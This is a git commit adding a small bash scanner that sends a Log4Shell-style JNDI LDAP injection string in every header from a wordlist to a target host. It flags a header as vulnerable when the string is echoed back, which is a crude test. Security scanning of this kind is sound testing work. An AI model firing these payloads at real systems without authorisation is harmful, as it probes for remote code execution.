05a7d1cacc843d7fe0352a7d32275570487041ce
Raja Soundaramourty <rajasoun@icloud.com>
2021-12-16 21:36:25 +0530

    tool collection for scanning

---
+++ dast/dast.sh
@@ -0,0 +1,23 @@
+#!/usr/bin/env bash
+
+NC=$'\e[0m' # No Color
+BOLD=$'\033[1m'
+UNDERLINE=$'\033[4m'
+RED=$'\e[31m'
+GREEN=$'\e[32m'
+BLUE=$'\e[34m'
+ORANGE=$'\x1B[33m'
+
+host=$1
+host_ip="$(ifconfig | grep "inet " | grep -Fv 127.0.0.1 | awk '{print $2}')"
+
+sed 1d headers-large.txt | while IFS= read -r header
+do
+  malicious_packet="$header: \${jndi:ldap://$host_ip:1389/o=reference}"
+  response=$(curl  -s -H "$malicious_packet" "$host")
+  response_check=$(echo $response | awk '{print $3}')
+  if [  $response_check = "\${jndi:ldap://$host_ip:1389/o=reference}" ]; then 
+    echo -e "${BOLD}${RED}\nVulnerable for header ->${NC} $header\n"
+  fi 
+done 
+IFS=$OLDIFS
